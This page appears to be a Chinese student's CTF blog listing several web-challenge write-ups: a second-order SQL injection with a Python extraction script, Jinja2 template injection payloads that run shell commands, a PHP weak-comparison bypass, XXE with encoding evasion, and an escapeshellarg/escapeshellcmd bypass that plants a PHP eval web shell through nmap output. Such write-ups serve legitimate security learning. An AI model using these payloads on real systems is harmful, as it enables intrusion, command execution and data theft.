<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">value</span>(<span class="string">&#x27;$email&#x27;</span>,<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>题目中，email和password好像都很难注入……测试时也只有改动username时回显不同</p>
<p>闭合引号’)#似乎不行，语句可能是：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> tablename (email,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="string">&#x27;$email&#x27;</span>,<span class="string">&#x27;$username&#x27;</span>,<span class="string">&#x27;$password&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>dalao操作似乎是利用mysql中的”加法“结合hex加密：</p>
<blockquote>
<p>**mysql中加号(+)**：</p>
<p>①如果双方都为数值型数据则结果为数值相加结果;</p>
<p>②如果有一方为字符型，则试图将字符型数值转换成数值型，如果转换成功，则继续做数值加法运算；</p>
<p>③如果有一方为null，则结果肯定为null。</p>
</blockquote>
<p>也就是说，直接0’ + database() +’0，实际上是0+0+<strong>int</strong>(database())，而结果开头为字母，即结果为<strong>0</strong></p>
<p>如果是version()：</p>
<img src="/images/网鼎杯-2018-unfinish/image-20210317144848852.png" alt="image-20210317144848852" style="zoom:70%;">

<p>version()的显示只剩下了<strong>5.5</strong>，后面的数据都么有了</p>
<p>可以利用双重hex加密或ord与ascii使返回结果为数字；另，若返回数字超过十位，会以科学计数法返回，造成数据损失……(还有，表名flag竟然是猜的,把information_schema禁了……</p>
<p>写脚本批量注册与登录，获取username数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">content = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#注册：</span></span><br><span class="line">url1 = <span class="string">&#x27;http://111.200.241.244:33496/register.php&#x27;</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line"> register = &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>: <span class="built_in">str</span>(x)+<span class="string">&quot;@qqq.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;username&quot;</span>: <span class="string">&quot;0&#x27;+( substr(hex(hex((select * from flag ))) from &quot;</span>+<span class="built_in">str</span>((x<span class="number">-1</span>)*<span class="number">10</span>+<span class="number">1</span>)+<span class="string">&quot; for 10))+&#x27;0&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line"> &#125;</span><br><span class="line"> response1 = requests.post(url=url1, data=register)</span><br><span class="line"></span><br><span class="line"><span class="comment">#登录，查username</span></span><br><span class="line">url2 = <span class="string">&#x27;http://111.200.241.244:33496/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    login = &#123;</span><br><span class="line">    <span class="string">&quot;email&quot;</span>: <span class="built_in">str</span>(x)+<span class="string">&quot;@qqq.com&quot;</span>,</span><br><span class="line">    <span class="string">&quot;password&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    response2 = requests.post(url=url2, data=login)</span><br><span class="line">    r = response2.text</span><br><span class="line">    left = r.find(<span class="string">&#x27;            &#x27;</span>)</span><br><span class="line">    right = r.find(<span class="string">&#x27;&lt;/span&gt;&#x27;</span>)</span><br><span class="line">    con = r[left:right].strip()</span><br><span class="line">    content += con</span><br><span class="line">    print(con)</span><br><span class="line">print(content)</span><br></pre></td></tr></table></figure>

<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/image-20210317145756747.png" alt="image-20210317145756747"></p>
<blockquote>
<p>没写停止，一下全输出了……</p>
</blockquote>
<p>hex解密：</p>
<p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-unfinish/image-20210317145858429.png" alt="image-20210317145858429"></p>
<blockquote>
<p>这好像叫做二次注入……和我理解的好像不一样，那上次用cookie回显是不是也算二次注入……</p>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-14  <a class="commentCountImg" href="/2021/03/14/XML/#comment-container"><span class="display-none-class">/2021/03/14/XML/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="9dff5bd570bd12babc78e58757c2f2f8">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>1 分钟  <i class="fas fa-pencil-alt"> </i>0.1 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/14/XML/">XML入门</a></h1><div class="content"><h4><span id="xml入门">XML入门</span></h4><p><strong>可扩展<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80">标记语言</a>，<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E5%87%86%E9%80%9A%E7%94%A8%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/6805073">标准通用标记语言</a>的子集，简称XML。是一种用于标记电子文件使其具有结构性的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%87%E8%AE%B0%E8%AF%AD%E8%A8%80/5964436">标记语言</a>。</strong></p>
<h5><span id="1引入">1.引入</span></h5><p>一段标准的xml数据格式：</p>
<p><img src="/images/XML/image-20210314131552521.png" alt="image-20210314131552521"></p>
<p>与HTML 不同，xml注重于数据的储存与传输而不是展示。</p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-10  <a class="commentCountImg" href="/2021/03/10/buu%E4%B8%A4%E9%81%93SSTI/#comment-container"><span class="display-none-class">/2021/03/10/buu两道SSTI/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="5741184334bc529c5d0058c240bc7363">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>3 分钟  <i class="fas fa-pencil-alt"> </i>0.5 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/10/buu%E4%B8%A4%E9%81%93SSTI/">buu两道SSTI</a></h1><div class="content"><h4><span id="buu两道ssti">buu两道SSTI</span></h4><h5><span id="1题目">1.题目：</span></h5><h5><span id="2过程">2.过程：</span></h5><h6><span id="web_python_template_injection">Web_python_template_injection</span></h6><p>进入题目，只有一个页面……随便访问一个：</p>
<img src="/images/buu两道SSTI/image-20210310193328950.png" alt="image-20210310193328950" style="zoom:50%;">

<p><img src="/images/buu%E4%B8%A4%E9%81%93SSTI/image-20210310193457920.png" alt="image-20210310193457920"></p>
<p>得到配置</p>
<p>这里简单的lipsum方法似乎不行……在不确定的情况下，可以用模板支持的python语句进行遍历：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123;c.__init__.func_globals[<span class="string">&#x27;linecache&#x27;</span>].__dict__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>找到指定的模块并运用即可：</p>
<img src="/images/buu两道SSTI/image-20210310194103588.png" alt="image-20210310194103588" style="zoom:50%;">

<img src="/images/buu两道SSTI/image-20210310194117771.png" alt="image-20210310194117771" style="zoom:50%;">

<p>获得flag</p>
<h6><span id="shrine">shrine</span></h6><p>进入题目发现给了python的源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/shrine/&lt;path:shrine&gt;&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



<p>设置了一个flask对象：app flag大概是被设置到对象的配置文件中</p>
<p>路由中有：/shrine/&lt;path:shrine&gt;</p>
<p>访问并查看源码：</p>
<p><img src="/images/buu%E4%B8%A4%E9%81%93SSTI/image-20210310193240514.png" alt="image-20210310193240514"></p>
<p>SSTI……blaklist</p>
<p>相当于：+s</p>
<p>还会替换 ‘(‘ 和 ‘)’  ……</p>
<blockquote>
<p>这里要注意，config是flask中的变量，记录了整个配置信息。set config=None仅仅是使得此方法无法使用，而不是替换’config‘为’None‘，所以  会返回None。我们仍有其他方法访问config。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self.__dict__&#125;&#125;也可以得到config，只是同样被禁用了……</span><br></pre></td></tr></table></figure>

<p> <strong>Flask特有的变量和函数</strong></p>
<p>config | request | session | url_for() | get_flashed_messages()</p>
<p>详细方法：<a target="_blank" rel="noopener" href="https://blog.csdn.net/enjolras_fuu/article/details/82229073">https://blog.csdn.net/enjolras_fuu/article/details/82229073</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在url_for.__globals__中，我们可以找到有关app配置的模块current_app</span><br><span class="line">可以通过&#123;&#123;url_for.__globals__[&#39;current_app&#39;].config&#125;&#125;来读取当前对象的配置</span><br><span class="line">get_flashed_messages中好像也有……</span><br></pre></td></tr></table></figure>

<blockquote>
<p>或许这种情况应该在这些函数中翻一翻相关的文件……就能找到方法</p>
</blockquote>
<img src="/images/buu两道SSTI/image-20210310193254568.png" alt="image-20210310193254568" style="zoom:67%;">

<p>获得flag</p>
<blockquote>
<p>两道题是不同的考点，都是基础……</p>
<p>学习了……</p>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-10  <a class="commentCountImg" href="/2021/03/10/xctf-lottery/#comment-container"><span class="display-none-class">/2021/03/10/xctf-lottery/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="41a3924f63e611a31d8971b813caa2a3">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>2 分钟  <i class="fas fa-pencil-alt"> </i>0.3 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/10/xctf-lottery/">xctf-lottery</a></h1><div class="content"><h4><span id="xctf-lottery">xctf-lottery</span></h4><h5><span id="1题目">1.题目：</span></h5><h5><span id="2过程">2.过程：</span></h5><p>lottery，彩票网站……</p>
<p>攻防世界直接给了附件，实际上题目存在/.git源码泄露：</p>
<img src="/images/xctf-lottery/image-20210310124701047.png" alt="image-20210310124701047" style="zoom:60%;">

<p>很多php文件，有session的储存，但似乎不是flask session伪造，config里也没有key之类的……大部分操作都集成在api中，api接受json格式的数据。不像Hgame的微积分数学题，可以自动获取公式计算刷分，这里的彩票数字是随机的：</p>
<p><img src="/images/xctf-lottery/image-20210310125320868.png" alt="image-20210310125320868"></p>
<p>那网站哪里会出问题，既没有像样的用户登录，session似乎也没毛病……</p>
<p>原来是php弱比较导致的漏洞：</p>
<p><img src="/images/xctf-lottery/image-20210310130729735.png" alt="image-20210310130729735"></p>
<blockquote>
<p>……</p>
</blockquote>
<p>直接遍历了输入的number，number的正常输入本应该为字符串，但json支持数组</p>
<blockquote>
<p>注意，在使用==比较时，true是可以和任何类型的字符串或数字相等，返回true，当然0和false和null除外（true==0或true==false或true==null）</p>
</blockquote>
<p>可以使用数组传入布尔值达到恒等：</p>
<img src="/images/xctf-lottery/image-20210310131637110.png" alt="image-20210310131637110" style="zoom:80%;">

<img src="/images/xctf-lottery/image-20210310131712557.png" alt="image-20210310131712557" style="zoom:89%;">

<blockquote>
<p>刷钱买flag即可……</p>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-09  <a class="commentCountImg" href="/2021/03/09/xctf-unagi/#comment-container"><span class="display-none-class">/2021/03/09/xctf-unagi/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="eed3ceb5088bda82606a80a4748548a7">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>3 分钟  <i class="fas fa-pencil-alt"> </i>0.5 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/09/xctf-unagi/">xctf-unagi</a></h1><div class="content"><h4><span id="xctf-unagi">xctf-unagi</span></h4><h6><span id="1题目">1.题目：</span></h6><h6><span id="2过程">2.过程：</span></h6><p>进入题目是一个网站导航，有一个上传点：</p>
<img src="/images/xctf-unagi/image-20210305175148141.png" alt="image-20210305175148141" style="zoom:80%;">

<p>上传新用户到系统……here中是：</p>
<img src="/images/xctf-unagi/image-20210305175416023.png" alt="image-20210305175416023" style="zoom:80%;">

<p>大概是一个xml的界面，演示了xml格式的用户数据，也就是需要我们上传类似的xml文件来上传新用户。</p>
<p><img src="/images/xctf-unagi/image-20210309171219845.png" alt="image-20210309171219845"></p>
<p>about中提示，应当读取/flag文件</p>
<blockquote>
<p>我一直很困惑于DTD这个东西，即使实体，也是规范……</p>
</blockquote>
<p><img src="/images/xctf-unagi/image-20210309171739424.png" alt="image-20210309171739424"></p>
<p>内部实体，规定了xml的几个元素，与元素的属性：</p>
<p><img src="/images/xctf-unagi/image-20210309171912700.png" alt="image-20210309171912700"></p>
<p>下面的xml数据需要根据DTD已有的定义（“规范”）来组织（这样的标签才会被正确解析？），DTD也可以是外部独立的，便于多个xml格式的文档引用</p>
<blockquote>
<p>假如 DTD 位于 XML 源文件的外部，那么它应通过下面的语法被封装在一个 DOCTYPE 定义中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure>

<p>eg：</p>
<p><img src="/images/xctf-unagi/image-20210309172332031.png" alt="image-20210309172332031"></p>
<p>（include？</p>
</blockquote>
<p>xxe的朴素运用，就是利用实体，读取内部敏感文件：</p>
<p><img src="/images/xctf-unagi/image-20210309172756732.png" alt="image-20210309172756732"></p>
<p>根据提示的xml结构，构造数据：</p>
<img src="/images/xctf-unagi/image-20210309173533674.png" alt="image-20210309173533674" style="zoom:80%;">

<blockquote>
<p>除了intro标签其他都有长度限制</p>
<p>intro标签可以在User界面找到</p>
<p>cred标签么有显示，大概是php代码不对这个标签识别</p>
</blockquote>
<p>上传后发现有waf阻挡</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4059">绕过WAF保护的XXE</a>中介绍了编码绕过，有效waf不支持一些编码，可以轻松绕过</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://mohemiv.com/tags/xxe/">https://mohemiv.com/tags/xxe/</a> 这个更详细，可惜全英……</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iconv -f utf8 -t utf16 1.xml&gt;2.xml</span><br></pre></td></tr></table></figure>

<p>转换后上传，即得到flag</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3357#toc-19">xxe深度学习</a></p>
<blockquote>
<p>如果目标网站能访问外网，访问个人服务器上的dtd，操作大概会更多一些？……</p>
</blockquote>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-09  <a class="commentCountImg" href="/2021/03/09/BUUCTF-2018-Online-Tool(nmap)/#comment-container"><span class="display-none-class">/2021/03/09/BUUCTF-2018-Online-Tool(nmap)/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="1b4cbd1180adbc372f3b49b88a66e87b">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>4 分钟  <i class="fas fa-pencil-alt"> </i>0.7 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/09/BUUCTF-2018-Online-Tool(nmap)/">BUUCTF-2018-Online-Tool</a></h1><div class="content"><h5><span id="buuctf-2018online-tool">[BUUCTF 2018]Online Tool</span></h5><h6><span id="1题目">1.题目：</span></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6><span id="2过程">2.过程：</span></h6><blockquote>
<p>关于escapeshellarg和escapeshellcmd</p>
<p><strong>escapeshellarg</strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
<p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec(), system() 执行运算符(反引号)</p>
<p><strong>escapeshellcmd</strong> — shell 元字符转义</p>
<p><strong>功能</strong>：escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.exec.php">exec()</a> 或 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a target="_blank" rel="noopener" href="http://php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。</p>
<p>反斜线（\）会在以下字符之前插入： <em>&amp;#;`|\</em>?~&lt;&gt;^()[]{}$<em>, <em>\x0A</em> 和 <em>\xFF\</em>。 \</em>’* 和 <em>“</em> 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 <em>%</em> 和 <em>!</em> 字符都会被空格代替。</p>
</blockquote>
<p>好像因为环境问题？本地测试不是很对……参考dalao：<a href="%5Bhttp://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/%5D(http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/)">谈谈escapeshellarg参数绕过和注入的问题</a></p>
<p>由于先使用<strong>escapeshellarg</strong>，再使用<strong>escapeshellcmd</strong>导致的命令执行漏洞</p>
<p>在线php测试成功了……：</p>
<p><img src="/images/BUUCTF-2018-Online-Tool/image-20210309164414644.png" alt="image-20210309164414644"></p>
<p>‘’   \   ‘’    A    ‘\‘   ‘’  ：这样显示，单引号都被闭合了，传入参数就可以成为命令执行</p>
<p><img src="/images/BUUCTF-2018-Online-Tool/image-20210309165949036.png" alt="image-20210309165949036"></p>
<blockquote>
<p>单引号前后要加空格，防止格式改变或后缀改变</p>
</blockquote>
<p>结合：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/107336#h3-5">利用/绕过 PHP escapeshellarg/escapeshellcmd函数</a></p>
<p>可知，需要利用预置的命令，拼接执行；这里关系到namp的命令</p>
<p>namp命令有保存扫描结果的命令：</p>
<blockquote>
<p><strong>Nmap输出格式</strong></p>
<ul>
<li>-oN <filespec> (标准输出)</filespec></li>
<li>-oX <filespec> (XML输出)</filespec></li>
<li>-oS <filespec> (ScRipT KIdd|3 oUTpuT)</filespec></li>
<li>-oG <filespec> (Grep输出)</filespec></li>
<li>-oA <basename> (输出至所有格式)</basename></li>
<li><a target="_blank" rel="noopener" href="http://www.nmap.com.cn/doc/manual.shtm#12">namp中文网#输出</a></li>
</ul>
</blockquote>
<p>在保存结果的同时，可以向文件中写入语句，这里写入一句话即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php @eval($_POST[&quot;ok&quot;]);?&gt; -oG 1.php &#39;</span><br></pre></td></tr></table></figure>

<p>sandbox指明文件目录，antsword链接：</p>
<p><img src="/images/BUUCTF-2018-Online-Tool/image-20210309170613645.png" alt="image-20210309170613645"></p>
<p>获取flag</p>
</div><div class="index-category-tag">  <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-03-04  <a class="commentCountImg" href="/2021/03/04/xctf-FlatScience/#comment-container"><span class="display-none-class">/2021/03/04/xctf-FlatScience/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="c85ae3416076c7bc1cd99371b176dc08">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>4 分钟  <i class="fas fa-pencil-alt"> </i>0.6 k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/03/04/xctf-FlatScience/">xctf-FlatScience</a></h1><div class="content"><h4><span id="xctf-flatscience">xctf-FlatScience</span></h4><h6><span id="1题目">1.题目：</span></h6><h6><span id="2过程">2.过程：</span></h6><p>这道题…………</p>
<p>打开上面写着：Best Papers，最好的论文，链接了好多paper，还是全英的……</p>
<p>查看robots.txt，找到login和admin页面，login页面源码发现注释：</p>
<p><img src="/images/xctf-FlatScience/image-20210304170216778.png" alt="image-20210304170216778"></p>
<blockquote>
<p>我看不懂，但我……</p>
</blockquote>
<p>在一通乱试下，原来是在login.php?debug……大概是个所谓的调试界面吧</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.$user.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.sha1($pass.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.$row[<span class="string">&#x27;name&#x27;</span>], time() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            header(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;debug&#x27;</span>]))</span><br><span class="line">highlight_file(<span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

